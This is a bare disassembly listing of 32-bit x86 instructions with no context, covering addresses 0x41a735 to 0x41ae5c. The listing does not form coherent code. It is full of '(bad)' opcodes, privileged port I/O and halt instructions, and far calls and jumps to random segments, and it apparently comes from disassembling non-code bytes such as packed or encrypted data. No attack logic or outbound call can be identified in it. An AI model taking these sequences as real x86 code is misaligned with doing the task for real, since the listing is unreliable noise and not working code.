  41a735:	sub    eax,ebx
  41a737:	sbb    bl,BYTE PTR [edi-0x21ff8612]
  41a73d:	mov    bl,0x6c
  41a73f:	shl    DWORD PTR [ecx+ecx*8],0x7e
  41a743:	sub    edx,DWORD PTR [edi+edx*4+0x266696c6]
  41a74a:	int3   
  41a74b:	fisttp QWORD PTR [edi+0x22b5113a]
  41a751:	and    eax,0xcee0287e
  41a756:	outs   dx,DWORD PTR ds:[esi]
  41a757:	fisttp DWORD PTR [edi]
  41a759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a75a:	in     al,dx
  41a75b:	outs   dx,BYTE PTR ds:[esi]
  41a75c:	push   ebp
  41a75d:	aam    0x7b
  41a75f:	xor    edx,DWORD PTR [ebx-0x1a93eb40]
  41a765:	int3   
  41a766:	sub    bh,BYTE PTR [ebx+0x3b]
  41a769:	inc    ebp
  41a76a:	icebp  
  41a76b:	mov    esi,0x6724305d
  41a770:	jge    0x41a785
  41a772:	jne    0x41a765
  41a774:	(bad)  
  41a775:	pop    ds
  41a776:	mov    esp,0x4e87572
  41a77b:	pop    es
  41a77c:	jae    0x41a769
  41a77e:	xor    al,0x78
  41a780:	mov    ds:0x39da38a3,al
  41a785:	int    0x9b
  41a787:	and    BYTE PTR [edi],bl
  41a789:	pop    ecx
  41a78a:	(bad)  
  41a78b:	pop    esp
  41a78c:	aas    
  41a78d:	js     0x41a806
  41a78f:	sbb    ch,BYTE PTR [ecx+edx*1-0x56cf5493]
  41a796:	rcl    DWORD PTR [edi],0x98
  41a799:	call   0xf53d:0xa9160ae
  41a7a0:	out    dx,al
  41a7a1:	jbe    0x41a72a
  41a7a3:	mov    bl,0x1c
  41a7a5:	add    bl,bh
  41a7a7:	loope  0x41a7a4
  41a7a9:	outs   dx,DWORD PTR ds:[esi]
  41a7aa:	daa    
  41a7ab:	das    
  41a7ac:	xchg   ecx,eax
  41a7ad:	or     eax,0x5da37b7f
  41a7b2:	dec    eax
  41a7b3:	cmc    
  41a7b4:	xchg   edx,eax
  41a7b5:	rcr    BYTE PTR [eax-0x7b],1
  41a7b8:	(bad)  
  41a7b9:	mov    BYTE PTR [ecx+0x12],dh
  41a7bc:	das    
  41a7bd:	sub    esi,DWORD PTR [eax+0x1a]
  41a7c0:	or     dl,BYTE PTR [ebx-0x2e]
  41a7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7c4:	ds into 
  41a7c6:	cmc    
  41a7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7c8:	shr    BYTE PTR [esi],cl
  41a7ca:	enter  0xe4e2,0xec
  41a7ce:	xchg   BYTE PTR [ebp+0x25],dh
  41a7d1:	mov    eax,0x9ee2e793
  41a7d6:	aaa    
  41a7d7:	and    al,0x50
  41a7d9:	test   eax,0xac9044fd
  41a7de:	pop    ecx
  41a7df:	jmp    0x41a81d
  41a7e1:	sub    eax,0x68312332
  41a7e6:	retf   
  41a7e7:	mul    bl
  41a7e9:	lea    edx,[eax+0x2f0b731c]
  41a7ef:	xlat   BYTE PTR ds:[ebx]
  41a7f0:	test   BYTE PTR [esi-0x7f21354a],dh
  41a7f6:	push   ss
  41a7f7:	pop    eax
  41a7f8:	push   ecx
  41a7f9:	adc    al,0xa5
  41a7fb:	lock rcr esp,cl
  41a7fe:	add    al,0x93
  41a800:	leave  
  41a801:	push   ecx
  41a802:	mov    cl,0x7e
  41a804:	mov    esp,0x84ef3b8c
  41a809:	outs   dx,DWORD PTR ds:[esi]
  41a80a:	out    dx,al
  41a80b:	sbb    eax,0xbf3521c2
  41a810:	gs jns 0x41a858
  41a813:	and    DWORD PTR [edx-0x55],ebp
  41a816:	mov    esi,0xd6cb25bd
  41a81b:	and    al,0xfc
  41a81d:	push   0x9d35b3a5
  41a822:	fdiv   QWORD PTR [edx]
  41a824:	jg     0x41a87a
  41a826:	jae    0x41a869
  41a828:	xor    DWORD PTR [esi-0x49],esi
  41a82b:	call   0x238e:0x6adf305c
  41a832:	cmp    edx,DWORD PTR [eax+0x2f5ad757]
  41a838:	mov    BYTE PTR [esi+edi*4-0x5c9079d4],ah
  41a83f:	fistp  QWORD PTR ds:0x3525f1da
  41a845:	or     DWORD PTR [ebp+0x3d],ebp
  41a848:	stos   BYTE PTR es:[edi],al
  41a849:	push   ds
  41a84a:	into   
  41a84b:	in     al,dx
  41a84c:	jge    0x41a8ab
  41a84e:	and    ch,BYTE PTR [eax-0xbe0a009]
  41a854:	rcr    edi,1
  41a856:	bound  edi,QWORD PTR [ecx+ebx*8-0x230c09ff]
  41a85d:	adc    esi,DWORD PTR [ebp-0x47]
  41a860:	sbb    BYTE PTR [eax],ch
  41a862:	(bad)  
  41a863:	fimul  DWORD PTR [ebp+0x3a]
  41a866:	aam    0x1e
  41a868:	add    ebp,DWORD PTR [esi-0x44]
  41a86b:	mov    ch,0xd8
  41a86d:	rcr    si,cl
  41a870:	repnz and al,0x88
  41a873:	pusha  
  41a874:	(bad)
  41a877:	sub    esp,DWORD PTR [eax+0x37987a50]
  41a87d:	(bad)  
  41a87f:	cmp    al,0x47
  41a881:	fst    QWORD PTR [ebp-0x17075099]
  41a887:	sbb    ecx,edx
  41a889:	fs mov ebp,esp
  41a88c:	(bad)  
  41a88d:	push   esi
  41a88e:	dec    esi
  41a88f:	or     DWORD PTR [eax+0x43],esi
  41a892:	cdq    
  41a893:	or     DWORD PTR [edx],ecx
  41a895:	add    al,0xd4
  41a897:	in     al,0xcb
  41a899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a89b:	lods   eax,DWORD PTR ds:[esi]
  41a89c:	scas   eax,DWORD PTR es:[edi]
  41a89d:	into   
  41a89e:	mov    DWORD PTR [ebx-0x56e8f23a],0x6eb350f4
  41a8a8:	mov    al,ds:0x46805e3b
  41a8ad:	lods   al,BYTE PTR ds:[esi]
  41a8ae:	and    al,0x22
  41a8b0:	and    BYTE PTR [esi+0x14],bh
  41a8b3:	retf   
  41a8b4:	or     edx,DWORD PTR ss:[esi]
  41a8b7:	dec    esi
  41a8b8:	call   0xd040:0xa984c7a2
  41a8bf:	je     0x41a8d6
  41a8c1:	leave  
  41a8c2:	dec    ebp
  41a8c3:	push   esi
  41a8c4:	push   esp
  41a8c5:	(bad)  
  41a8c6:	test   BYTE PTR [edx+eax*1+0x5e5062af],ch
  41a8cd:	fdivr  QWORD PTR [esi+0x71018148]
  41a8d3:	fidivr DWORD PTR [eax+ecx*2-0x27eba92b]
  41a8da:	push   eax
  41a8db:	pop    ss
  41a8dc:	(bad)  
  41a8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8de:	pushf  
  41a8df:	loope  0x41a88b
  41a8e1:	mov    esi,0x38227ca7
  41a8e6:	cmp    DWORD PTR [edx],ebx
  41a8e8:	inc    esp
  41a8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ea:	jle    0x41a8dd
  41a8ec:	out    dx,al
  41a8ed:	fs mov cl,0xa
  41a8f0:	inc    eax
  41a8f1:	test   eax,0x76dc3bba
  41a8f6:	adc    DWORD PTR [esi+edi*1-0x400bd295],edx
  41a8fd:	clc    
  41a8fe:	and    al,BYTE PTR [ebx-0xb]
  41a901:	and    al,0x1e
  41a903:	mov    al,0x8f
  41a905:	xchg   ebx,eax
  41a906:	(bad)  
  41a907:	mov    bl,0xda
  41a909:	sbb    DWORD PTR [edi],ebp
  41a90b:	mov    edx,0x94bfa981
  41a910:	fwait
  41a911:	jnp    0x41a896
  41a913:	fisubr WORD PTR [ebp-0x67]
  41a916:	adc    DWORD PTR [eax-0x5b],ebx
  41a919:	xchg   esp,eax
  41a91a:	in     eax,dx
  41a91b:	jnp    0x41a95f
  41a91d:	jp     0x41a943
  41a91f:	rcr    BYTE PTR [edi-0x301a5477],1
  41a925:	xor    al,bh
  41a927:	and    edx,DWORD PTR [esi]
  41a929:	jo     0x41a8c3
  41a92b:	setl   BYTE PTR [ebx+0x2c]
  41a92f:	push   cs
  41a930:	pop    ebx
  41a931:	sti    
  41a932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a933:	push   esi
  41a934:	mov    BYTE PTR [eax+0x79],dh
  41a937:	rcr    DWORD PTR [edx+0x26],1
  41a93a:	aam    0x23
  41a93c:	(bad)  
  41a93d:	and    esp,esp
  41a93f:	stos   DWORD PTR es:[edi],eax
  41a940:	rol    DWORD PTR [ebp-0x52],0xbe
  41a944:	ja     0x41a99c
  41a946:	(bad)  
  41a947:	or     al,0x4a
  41a949:	cmp    eax,esi
  41a94b:	sbb    eax,DWORD PTR [esi-0x30]
  41a94e:	lds    esi,FWORD PTR [ebp-0x22a8ab90]
  41a954:	xchg   ebp,eax
  41a955:	enter  0x34ff,0xdb
  41a959:	jp     0x41a913
  41a95b:	jns    0x41a9a0
  41a95d:	scas   al,BYTE PTR es:[edi]
  41a95e:	adc    DWORD PTR [ebx-0x18],ebx
  41a961:	xor    al,ch
  41a963:	jg     0x41a97f
  41a965:	lea    ebp,[edx-0x44]
  41a968:	mov    DWORD PTR [edi],edx
  41a96a:	xchg   esi,eax
  41a96b:	mov    cl,0x1e
  41a96d:	cmp    DWORD PTR [ecx],ebx
  41a96f:	and    BYTE PTR [edx-0x10b49703],cl
  41a975:	lods   al,BYTE PTR ds:[esi]
  41a976:	out    dx,al
  41a977:	repz call 0xca16:0x64050133
  41a97f:	fidivr WORD PTR [ebp+0x7c4dc297]
  41a985:	jne    0x41a9a1
  41a987:	lock inc edx
  41a989:	push   0xc4dc9f29
  41a98e:	iret   
  41a98f:	shl    eax,cl
  41a991:	jnp    0x41a9f7
  41a993:	aad    0xcb
  41a995:	aad    0x87
  41a997:	arpl   WORD PTR [ebx+edx*1+0x59ae0d5d],bp
  41a99e:	add    eax,0x29b3e3ca
  41a9a3:	jl     0x41a958
  41a9a5:	xchg   BYTE PTR [ebx],ch
  41a9a7:	ret    
  41a9a8:	popf   
  41a9a9:	in     eax,dx
  41a9aa:	out    0xd0,eax
  41a9ac:	mov    eax,ds:0xedf939e5
  41a9b1:	pop    es
  41a9b2:	cmp    DWORD PTR [edi-0x79fafc92],ecx
  41a9b8:	cmp    al,0xce
  41a9ba:	mov    esi,0x8ceb6ff0
  41a9bf:	popf   
  41a9c0:	sub    ecx,DWORD PTR [ecx+0x101da033]
  41a9c6:	adc    dh,BYTE PTR [edx+ebx*2-0x75563b97]
  41a9cd:	push   ecx
  41a9ce:	call   0xeddfeffd
  41a9d3:	(bad)  
  41a9d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9d5:	(bad)  
  41a9d6:	out    0xbc,al
  41a9d8:	pop    edi
  41a9d9:	sbb    al,0x91
  41a9db:	sahf   
  41a9dc:	xlat   BYTE PTR ds:[ebx]
  41a9dd:	je     0x41a97f
  41a9df:	test   al,0x3c
  41a9e1:	sbb    eax,0xfa949c49
  41a9e6:	inc    eax
  41a9e7:	test   BYTE PTR [ecx+0x3c3eb4b1],ch
  41a9ed:	xchg   esi,eax
  41a9ee:	pop    ss
  41a9ef:	push   ebp
  41a9f0:	hlt    
  41a9f1:	cmp    BYTE PTR [esi+0x3a],bl
  41a9f4:	loop   0x41aa71
  41a9f6:	scas   al,BYTE PTR es:[edi]
  41a9f7:	aam    0x83
  41a9f9:	stos   DWORD PTR es:[edi],eax
  41a9fa:	mov    WORD PTR [edx],gs
  41a9fc:	push   ecx
  41a9fd:	pop    ebp
  41a9fe:	fdivr  DWORD PTR [ebp-0x2d]
  41aa01:	int3   
  41aa02:	pop    esi
  41aa03:	sub    al,0x8c
  41aa05:	pop    ecx
  41aa06:	test   ebx,edx
  41aa08:	imul   esp,DWORD PTR [esi],0xa
  41aa0b:	push   edx
  41aa0c:	and    DWORD PTR [esi],0xffffffd0
  41aa0f:	or     BYTE PTR ss:[eax],ah
  41aa12:	pop    ebx
  41aa13:	pushf  
  41aa14:	jb     0x41aa05
  41aa16:	sbb    ah,BYTE PTR [eax+ebp*1-0x26]
  41aa1a:	cmp    bh,bl
  41aa1c:	sbb    eax,0xf729439b
  41aa21:	xchg   ebx,eax
  41aa22:	popa   
  41aa23:	lds    ebp,FWORD PTR [ecx+0x4c]
  41aa26:	cmc    
  41aa27:	and    ah,BYTE PTR [edi+ecx*2+0x61]
  41aa2b:	call   0x1d23:0x136bc019
  41aa32:	sub    DWORD PTR [eax-0x45e247c6],eax
  41aa38:	in     al,dx
  41aa39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa3a:	in     al,dx
  41aa3b:	push   ds
  41aa3c:	jle    0x41aa41
  41aa3e:	add    bl,dl
  41aa40:	ficom  DWORD PTR [eax]
  41aa42:	xchg   ebx,eax
  41aa43:	mov    eax,ds:0x12a5e5b3
  41aa48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa49:	xchg   ebx,eax
  41aa4a:	inc    edi
  41aa4b:	repnz sub edi,esi
  41aa4e:	sub    dl,BYTE PTR [ecx+0x28]
  41aa51:	xor    al,0xfc
  41aa53:	imul   eax,esi,0xffffff88
  41aa56:	retf   
  41aa57:	rol    BYTE PTR [edi+0x53],1
  41aa5a:	mov    edx,0x5f07ca41
  41aa5f:	push   ss
  41aa60:	dec    ebp
  41aa61:	sub    BYTE PTR [eax+0x7a],cl
  41aa64:	xor    BYTE PTR [edx+0x7d],dl
  41aa67:	xchg   ebp,eax
  41aa69:	push   cs
  41aa6a:	scas   eax,DWORD PTR es:[edi]
  41aa6b:	pop    edx
  41aa6c:	and    al,0x5c
  41aa6e:	fsub   DWORD PTR [eax+ebx*8+0x70612bb4]
  41aa75:	test   BYTE PTR [ebx],0xb
  41aa78:	push   ebp
  41aa79:	rcr    BYTE PTR [edx],cl
  41aa7b:	jmp    0x2ad9:0x34d3fb60
  41aa82:	sbb    al,0xff
  41aa84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa85:	hlt    
  41aa86:	pop    eax
  41aa87:	sub    dx,WORD PTR [ebx]
  41aa8a:	adc    cl,BYTE PTR [ebx+0x3feb6e8f]
  41aa90:	add    eax,0x38f899cf
  41aa95:	sar    dh,0x7c
  41aa98:	xor    al,0x66
  41aa9a:	mov    ch,0x94
  41aa9c:	into   
  41aa9d:	repz inc ecx
  41aa9f:	(bad)  
  41aaa0:	adc    al,0xd7
  41aaa2:	in     eax,dx
  41aaa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaa4:	mov    ah,BYTE PTR [ebx]
  41aaa6:	in     al,dx
  41aaa7:	loopne 0x41aacc
  41aaa9:	sti    
  41aaaa:	adc    BYTE PTR [esi],dh
  41aaac:	mov    eax,esi
  41aaae:	mov    edi,0xb853fd19
  41aab3:	xchg   esi,eax
  41aab4:	mov    cl,0xf2
  41aab6:	adc    al,ch
  41aab8:	ret    0x4fc0
  41aabb:	adc    eax,0x9958e43d
  41aac0:	jnp    0x41ab21
  41aac2:	fbld   TBYTE PTR [esi-0x1e6bcd10]
  41aac8:	pop    ebx
  41aac9:	mov    ds:0x934e5b74,al
  41aace:	test   edi,esp
  41aad0:	dec    DWORD PTR [ebp-0x3ce462fc]
  41aad6:	jmp    0x9f1e:0x82940559
  41aadd:	jae    0x41aaf2
  41aadf:	xor    ebx,DWORD PTR [ebp+0x63dd2d0f]
  41aae5:	fnstenv [ebx-0x7a]
  41aae8:	dec    esi
  41aae9:	sbb    eax,0x8c14cba2
  41aaee:	add    bh,BYTE PTR [edi-0x6cd9e66e]
  41aaf4:	fucomp st(5)
  41aaf6:	(bad)  
  41aaf7:	sbb    eax,0x9e03abd2
  41aafc:	pusha  
  41aafd:	push   0x61
  41aaff:	cdq    
  41ab00:	mov    esp,0x5b8e90ab
  41ab05:	out    0x93,al
  41ab07:	or     dl,BYTE PTR [esi]
  41ab09:	or     DWORD PTR [ecx+0x25],ebp
  41ab0c:	dec    ebp
  41ab0d:	pop    eax
  41ab0e:	cmp    BYTE PTR [edi],bh
  41ab10:	push   es
  41ab11:	jecxz  0x41ab8a
  41ab13:	xchg   ebp,eax
  41ab14:	jae    0x41ab1a
  41ab16:	(bad)  
  41ab17:	mov    ebx,0x72712151
  41ab1c:	push   ss
  41ab1d:	mov    edx,0x578c3e4e
  41ab22:	(bad)
  41ab25:	loopne 0x41ab39
  41ab27:	pop    eax
  41ab28:	and    al,0xc9
  41ab2a:	loopne 0x41ab74
  41ab2c:	xor    edi,DWORD PTR [eax-0x5f5ebb3]
  41ab32:	jbe    0x41ab02
  41ab34:	daa    
  41ab35:	jns    0x41ab68
  41ab37:	in     al,dx
  41ab38:	xchg   BYTE PTR [esi],al
  41ab3a:	pop    DWORD PTR [ebx+0x13513963]
  41ab40:	dec    esi
  41ab41:	or     ecx,eax
  41ab43:	mov    edx,0x4e245ed1
  41ab48:	inc    eax
  41ab49:	test   al,0x8f
  41ab4b:	or     al,0x61
  41ab4d:	push   esp
  41ab4e:	shl    BYTE PTR [edx+0x37],1
  41ab51:	(bad)  
  41ab52:	nop
  41ab53:	mov    esp,0x3e9ac394
  41ab58:	add    BYTE PTR [edx+0x7586b755],0x42
  41ab5f:	jmp    0x9fdf45c2
  41ab64:	sub    al,0xa2
  41ab66:	stos   BYTE PTR es:[edi],al
  41ab67:	mov    eax,0xa1ab502b
  41ab6c:	push   ss
  41ab6d:	sti    
  41ab6e:	mov    bh,0x1f
  41ab70:	out    0x46,al
  41ab72:	jae    0x41abb2
  41ab74:	pop    esi
  41ab75:	mov    dh,BYTE PTR [edx]
  41ab77:	xchg   BYTE PTR [ebx+0x4c5a9263],dl
  41ab7d:	pop    ebx
  41ab7e:	cmp    eax,0x18fce19c
  41ab83:	push   eax
  41ab84:	push   ebx
  41ab85:	add    esp,DWORD PTR cs:[edx+0x38098839]
  41ab8c:	(bad)  
  41ab8d:	es pusha 
  41ab8f:	sbb    DWORD PTR [ebx],esi
  41ab91:	jmp    0x41abb0
  41ab93:	and    ch,BYTE PTR [esi-0x5d]
  41ab96:	inc    ebp
  41ab97:	and    ebp,DWORD PTR [ecx]
  41ab99:	mov    dh,0x35
  41ab9b:	xlat   BYTE PTR ds:[ebx]
  41ab9c:	ret    0xb983
  41ab9f:	mov    esp,0xe12b823d
  41aba4:	ret    0x3e3f
  41aba7:	inc    ecx
  41aba8:	int3   
  41aba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abaa:	or     edi,edx
  41abac:	repnz push 0x12
  41abaf:	jno    0x41ac18
  41abb1:	mov    DWORD PTR [eax],esi
  41abb3:	dec    edx
  41abb4:	push   edx
  41abb5:	mov    ah,BYTE PTR [edx-0x5f5bc7e1]
  41abbb:	shl    BYTE PTR [esi],cl
  41abbd:	outs   dx,DWORD PTR ds:[esi]
  41abbe:	imul   esi,DWORD PTR [ecx+0x68],0xffffff94
  41abc2:	lock jbe 0x41ac44
  41abc5:	mov    ch,0xc9
  41abc7:	push   eax
  41abc8:	not    DWORD PTR [ebp+edi*1+0x17]
  41abcc:	mov    WORD PTR [edx],fs
  41abce:	sti    
  41abcf:	pop    ss
  41abd0:	push   ds
  41abd1:	xlat   BYTE PTR ds:[ebx]
  41abd2:	loop   0x41abbd
  41abd4:	(bad)  
  41abd5:	push   ecx
  41abd6:	idiv   DWORD PTR [eiz*4-0x7863c803]
  41abdd:	in     eax,dx
  41abde:	xor    BYTE PTR [esp+edi*4],0xdd
  41abe2:	pop    esp
  41abe3:	cmp    BYTE PTR [esi+0x38],cl
  41abe6:	lea    ebp,[ecx]
  41abe8:	mov    edi,0xcfebe4b2
  41abed:	xchg   ebx,eax
  41abee:	xchg   edx,eax
  41abef:	loop   0x41ac51
  41abf1:	retf   
  41abf2:	iret   
  41abf3:	or     BYTE PTR [edi-0x7a37724f],cl
  41abf9:	mov    edx,0xda4a3389
  41abfe:	dec    ebp
  41abff:	sbb    eax,0xe6ef0d23
  41ac04:	in     al,0x52
  41ac06:	push   edi
  41ac07:	or     DWORD PTR [esp+ebp*8-0x23],0x5
  41ac0c:	je     0x41aba9
  41ac0e:	xchg   ebx,eax
  41ac0f:	or     ch,dl
  41ac11:	pop    es
  41ac12:	scas   eax,DWORD PTR es:[edi]
  41ac13:	mov    eax,ds:0xa5580b3e
  41ac18:	repnz enter 0xd050,0x67
  41ac1d:	fcom   st(7)
  41ac1f:	cld    
  41ac20:	test   eax,0xf625ff68
  41ac25:	test   al,0x10
  41ac27:	in     eax,0x3f
  41ac29:	sbb    edx,ebp
  41ac2b:	outs   dx,DWORD PTR ds:[esi]
  41ac2c:	sub    al,0x90
  41ac2e:	pop    ebx
  41ac2f:	sbb    BYTE PTR [eax-0x28],bl
  41ac32:	pop    esp
  41ac33:	fsubr  st,st(5)
  41ac35:	rol    dh,0x4f
  41ac38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac39:	xchg   esi,eax
  41ac3a:	mov    ebx,0xf96b339a
  41ac3f:	push   esp
  41ac40:	cmc    
  41ac41:	mov    eax,0xa2aea69d
  41ac46:	xchg   edi,edi
  41ac48:	loop   0x41ac1b
  41ac4a:	pop    ds
  41ac4b:	dec    eax
  41ac4c:	mov    ds:0x13fd34d5,al
  41ac51:	xchg   esp,eax
  41ac52:	sub    DWORD PTR [esi-0x75],0x57
  41ac56:	(bad)  
  41ac57:	mov    cl,0xc0
  41ac59:	out    dx,al
  41ac5a:	sbb    eax,0x4c36d40e
  41ac5f:	int3   
  41ac60:	sti    
  41ac61:	adc    BYTE PTR [edx-0x7a4c363e],0x14
  41ac68:	out    0x4c,al
  41ac6a:	mov    BYTE PTR [edi],0x30
  41ac6d:	in     eax,dx
  41ac6e:	push   es
  41ac6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac70:	test   BYTE PTR [eax+0x1ce03d9c],cl
  41ac76:	cmp    BYTE PTR [esi],dl
  41ac78:	jle    0x41ac57
  41ac7a:	ins    BYTE PTR es:[edi],dx
  41ac7b:	aam    0x99
  41ac7d:	and    BYTE PTR [edi+edi*2-0x31],dl
  41ac81:	mov    dl,0xbd
  41ac83:	gs sbb eax,0x240e5c5f
  41ac89:	(bad)  
  41ac8a:	es sahf 
  41ac8c:	mov    bl,0xf4
  41ac8e:	cli    
  41ac8f:	pop    ss
  41ac90:	ds pusha 
  41ac92:	imul   esi,DWORD PTR [ebx],0x193c263a
  41ac98:	or     BYTE PTR [ecx-0x4df21ae0],cl
  41ac9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac9f:	clc    
  41aca0:	xchg   esi,eax
  41aca1:	jmp    0xa4f5dd2e
  41aca6:	inc    eax
  41aca7:	pop    esp
  41aca8:	mov    bl,0x94
  41acaa:	fst    QWORD PTR [ebp-0x1c]
  41acad:	adc    dl,BYTE PTR [ebp+esi*2+0x48]
  41acb1:	mov    ah,0x6a
  41acb3:	retf   0xf6fc
  41acb6:	mov    ebx,0x4a2e9419
  41acbb:	je     0x41ace2
  41acbd:	loope  0x41acce
  41acbf:	pop    edi
  41acc0:	addr16 jae 0x41acfc
  41acc3:	cmp    al,0xcd
  41acc5:	and    al,0x26
  41acc7:	mov    eax,ds:0x19626afa
  41accc:	inc    edi
  41accd:	cmp    eax,0x47b02bc0
  41acd2:	pop    esi
  41acd3:	sbb    bh,bh
  41acd5:	push   ss
  41acd6:	pop    ds
  41acd7:	clc    
  41acd8:	in     eax,dx
  41acd9:	fistp  QWORD PTR [edx]
  41acdb:	sub    DWORD PTR [edi],0x16c59033
  41ace1:	hlt    
  41ace2:	leave  
  41ace3:	xchg   edi,eax
  41ace4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace5:	test   eax,0x3a7636c2
  41aceb:	jmp    DWORD PTR [eax]
  41aced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acee:	mov    ebp,0xf3485d3d
  41acf3:	out    dx,eax
  41acf4:	pop    esp
  41acf5:	icebp  
  41acf6:	out    dx,eax
  41acf7:	jmp    0x9af5:0xa2c436e3
  41acfe:	push   edi
  41acff:	test   al,0x14
  41ad01:	stos   DWORD PTR es:[edi],eax
  41ad02:	inc    BYTE PTR [edx+esi*4-0x5b19beac]
  41ad09:	add    DWORD PTR [ebx-0x4fac0dd1],edx
  41ad0f:	add    eax,0xd576c11b
  41ad14:	jp     0x41ad77
  41ad16:	jnp    0x41ad7d
  41ad18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad19:	sbb    dh,dh
  41ad1b:	mov    ds:0x243a2d11,al
  41ad20:	adc    BYTE PTR [edi],al
  41ad22:	and    al,0xf6
  41ad24:	cwde   
  41ad25:	mov    ds:0x24abf59c,eax
  41ad2a:	aaa    
  41ad2b:	fld    TBYTE PTR ds:0x947c7b71
  41ad31:	push   ecx
  41ad32:	fsubrp st(6),st
  41ad34:	xchg   edx,eax
  41ad35:	enter  0x1d87,0x50
  41ad39:	pop    edx
  41ad3a:	mov    edx,0x7573791c
  41ad3f:	repz repz ret 0xa9b
  41ad44:	in     eax,dx
  41ad45:	add    ebp,eax
  41ad47:	push   cs
  41ad48:	imul   esi,DWORD PTR [ebx],0xffffff9b
  41ad4b:	dec    edx
  41ad4c:	xor    ecx,edi
  41ad4e:	xchg   edx,eax
  41ad4f:	retf   0xfd76
  41ad52:	ins    BYTE PTR es:[edi],dx
  41ad53:	iret   
  41ad54:	sub    eax,esp
  41ad56:	and    DWORD PTR [edi],0xffffffc4
  41ad59:	inc    eax
  41ad5a:	dec    edx
  41ad5b:	aam    0x41
  41ad5d:	sub    ebp,DWORD PTR [bp+si+0x31]
  41ad61:	jmp    0x41ad22
  41ad63:	sbb    BYTE PTR [ecx-0x6c708984],bl
  41ad69:	push   es
  41ad6a:	mov    bl,0x95
  41ad6c:	call   0x5a8:0xc64c1871
  41ad73:	sbb    eax,0xc6ba6fe5
  41ad78:	jp     0x41adde
  41ad7a:	push   edx
  41ad7b:	outs   dx,DWORD PTR ds:[esi]
  41ad7c:	das    
  41ad7d:	enter  0xcc1b,0x77
  41ad81:	dec    ebp
  41ad82:	jg     0x41ad10
  41ad84:	shl    DWORD PTR [edx],1
  41ad86:	div    BYTE PTR [edx-0x5c8d723c]
  41ad8c:	push   edx
  41ad8d:	sbb    BYTE PTR [eax-0x10],dl
  41ad90:	push   es
  41ad91:	jmp    0x7958:0x70b954c8
  41ad98:	mov    BYTE PTR [ebx+0x59],bh
  41ad9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad9c:	mov    ds:0x27f13e91,eax
  41ada1:	adc    al,BYTE PTR [edx-0x4c]
  41ada4:	dec    edi
  41ada5:	or     cl,BYTE PTR [eax-0x38f11714]
  41adab:	jle    0x41ad48
  41adad:	mov    bl,0x92
  41adaf:	xor    BYTE PTR [esi+0x2b],ch
  41adb2:	ficomp DWORD PTR [esi]
  41adb4:	mov    dl,0x16
  41adb6:	ficomp DWORD PTR [edx]
  41adb8:	inc    ebx
  41adb9:	dec    ebp
  41adba:	dec    edi
  41adbb:	push   cs
  41adbc:	sub    BYTE PTR [ebp+ebp*2+0x23],ah
  41adc0:	sbb    cl,BYTE PTR [edx+0x66]
  41adc3:	mov    edi,0x75e10ea6
  41adc8:	aam    0x9f
  41adca:	jp     0x41ad90
  41adcc:	call   0xa0bc378a
  41add1:	pop    esi
  41add2:	lods   al,BYTE PTR ds:[esi]
  41add3:	jns    0x41ada6
  41add5:	sar    bh,0x25
  41add8:	inc    eax
  41add9:	lds    edx,FWORD PTR [ecx+0x56dc6ac6]
  41addf:	mov    ebp,0x5f8c1a5d
  41ade4:	pop    ss
  41ade5:	cwde   
  41ade6:	inc    edx
  41ade7:	jne    0x41ad7c
  41ade9:	stos   BYTE PTR es:[edi],al
  41adea:	jp     0x41ae14
  41adec:	inc    edx
  41aded:	sbb    al,0x29
  41adef:	add    eax,0x7d266e3a
  41adf4:	(bad)  
  41adf6:	stos   DWORD PTR es:[edi],eax
  41adf7:	mov    al,ds:0xc51ad2bc
  41adfc:	into   
  41adfd:	inc    esp
  41adfe:	ins    BYTE PTR es:[edi],dx
  41adff:	jae    0x41ae32
  41ae01:	jo     0x41ae63
  41ae03:	sbb    eax,0xba4b46e
  41ae08:	adc    DWORD PTR [edi-0x7d],edx
  41ae0b:	es pop edi
  41ae0d:	adc    ebp,DWORD PTR [edx-0x30592969]
  41ae13:	pop    es
  41ae14:	ins    BYTE PTR es:[edi],dx
  41ae15:	pop    ds
  41ae16:	sub    eax,0xec4f38ef
  41ae1b:	xor    al,BYTE PTR [edi-0x2c53983c]
  41ae21:	add    dx,bp
  41ae24:	jb     0x41ae79
  41ae26:	mov    eax,ds:0xd3aa627a
  41ae2b:	ds xor al,0x68
  41ae2e:	scas   eax,DWORD PTR es:[edi]
  41ae2f:	les    esp,FWORD PTR [edi+esi*2+0x3b8999b9]
  41ae36:	idiv   ebx
  41ae38:	popf   
  41ae39:	push   edx
  41ae3a:	aas    
  41ae3b:	sub    ebx,DWORD PTR [edi]
  41ae3d:	sub    edi,ebx
  41ae3f:	cmp    ebp,DWORD PTR [edi+0x68]
  41ae42:	rcl    DWORD PTR [ebp-0xa],cl
  41ae45:	aam    0x9f
  41ae47:	dec    esi
  41ae48:	cld    
  41ae49:	ins    DWORD PTR es:[edi],dx
  41ae4a:	xor    eax,0x91a69a98
  41ae4f:	shl    BYTE PTR [ecx],1
  41ae51:	push   0x2146a130
  41ae56:	lods   eax,DWORD PTR gs:[esi]
  41ae58:	pop    eax
  41ae59:	jno    0x41ae3a
  41ae5b:	dec    ebp
  41ae5c:	imul   ebp,DWORD PTR [ebp+eiz*8+0x23],0xea9c892c
